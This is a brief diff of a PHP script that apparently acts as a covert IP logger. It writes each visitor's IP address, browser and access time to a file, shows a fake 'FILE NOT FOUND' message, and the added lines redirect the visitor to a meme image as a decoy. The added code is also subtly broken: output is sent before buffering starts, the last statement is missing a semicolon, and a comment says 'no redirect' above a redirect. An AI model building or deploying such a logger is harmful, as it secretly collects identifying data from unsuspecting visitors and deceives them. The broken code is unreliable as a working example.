@@ -10,4 +10,16 @@ $data = "<pre><b>User IP</b>: $ip <b> Browser</b>: $browser <br>on Time : $dateT
 fwrite($file, $data);
 fclose($file);
 echo "<h1>FILE NOT FOUND</h1>";
+// Enviarlo a otro lado
+ob_start(); // ensures anything dumped out will be caught
+
+// do stuff here
+$url = 'https://www.memecreator.org/static/images/memes/3975375.jpg'; // this can be set based on whatever
+// clear out the output buffer
+while (ob_get_status()) 
+{
+    ob_end_clean();
+}
+// no redirect
+header( "Location: $url" )
 ?>
